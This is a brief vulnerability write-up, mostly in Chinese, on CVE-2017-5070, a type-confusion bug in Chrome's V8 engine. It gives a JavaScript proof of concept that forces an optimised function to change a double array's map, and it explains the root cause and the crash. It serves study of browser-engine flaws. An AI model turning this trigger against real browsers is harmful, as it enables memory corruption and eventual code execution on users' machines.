# CVE-2017-5070

## 参考
1. [POC Code](https://chromium.googlesource.com/v8/v8.git/+/e33fd30777f99a0d6e16b16d096a2663b1031457)
2. [Exploit Code](https://bugs.chromium.org/p/chromium/issues/detail?id=722756)
3. [有问题的V8](https://chromium.googlesource.com/v8/v8/+/5.8-lkgr)

## Root Cause
```

var array = [[{}], [1.1]];
var double_arr2 = [1.1,2.2];
function transition() {
  for(var i = 0; i < array.length; i++){
    var arr = array[i];
    arr[0] = {};
  }

}

var flag = 0;
function swap() {
  try {} catch(e) {}  // Prevent Crankshaft from inlining this.
  if (flag == 1) {
    array[1] = double_arr2;
  }
}
var expected = 6.176516726456e-312;
function f(){
  Math.sin(1);
  swap();  
  double_arr2[0] = 1;
  transition(); 
  double_arr2[1] = expected; 
  
}
%DebugPrint(double_arr2);
f();
%OptimizeFunctionOnNextCall(f);
flag = 1;
f();

print ("111");
print (expected === double_arr2[1]);
print ("222")

```

大致分析是double_arr2的map给修改, 引发类型混淆

进一步确定root cause 

![](CVE-2017-5070/CVE-2017-50700.png)

什么情况下会触发修改map的call function呢？ 对应OPT Code 如下：
![](CVE-2017-5070/CVE-2017-50701.png)

所以，arr[0] = {}， double_arr2 由[1, 6.176516726456e-312] 变成了 [{}, 6.176516726456e-312], 触发了transition

![](CVE-2017-5070/CVE-2017-50702.png)

进一步,Crash原因
![](CVE-2017-5070/CVE-2017-50703.png)
